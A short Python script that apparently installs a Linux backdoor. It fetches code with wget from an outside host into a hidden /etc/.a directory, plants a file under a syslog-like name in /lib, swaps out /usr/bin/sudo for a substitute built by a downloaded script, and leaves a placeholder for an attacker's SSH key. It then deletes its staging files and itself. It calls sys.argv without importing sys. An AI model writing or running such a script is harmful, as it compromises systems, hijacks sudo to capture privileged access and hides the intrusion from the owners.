import os

def main():
    sshKey = "" #TODO - Enter public SSH key here
    
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/syslogT")
    os.system("mv /etc/.a/files.ravenn.net/horror/syslogT /etc/.a")
    os.system("mv /etc/.a/syslogT/syslogT.py /lib/syslogb")
    os.system("touch /lib/syslogbLog")
    os.system("mv /usr/bin/sudo /usr/bin/sudoA")
    os.system("bash /etc/.a/syslogT/sudoMaker.sh")
    print("Installation complete. Goodbye")
    os.system("rm -rf /etc/.a")
    os.remove(sys.argv[0])
    
main()